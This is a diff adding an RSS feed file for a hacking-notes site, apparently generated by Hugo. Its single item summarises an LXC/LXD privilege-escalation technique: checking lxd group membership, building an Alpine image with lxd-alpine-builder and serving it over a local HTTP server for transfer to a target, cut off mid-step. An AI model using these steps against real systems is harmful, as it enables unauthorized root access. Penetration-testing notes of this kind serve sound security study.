@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Container on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/linux/container/</link>
+    <description>Recent content in Container on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 11:37:18 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/linux/container/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>LXC/LXD (Linux Container/Daemon) Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/container/lxc-lxd-privilege-escalation/</link>
+      <pubDate>Mon, 30 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/container/lxc-lxd-privilege-escalation/</guid>
+      <description>Basic Flow link Check if You are in the Lxd Group&#xA;If you belong to the Lxd group, you may be able to the root privileges.&#xA;groups id Check if Container Image Exists&#xA;List all images and check if a container image already exists.&#xA;lxc image list If there are not container, build a new image in your local machine.&#xA;git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder sudo ./build-alpine python3 -m http.server 8000 In remote machine, download the “alpine-*.</description>
+    </item>
+  </channel>
+</rss>
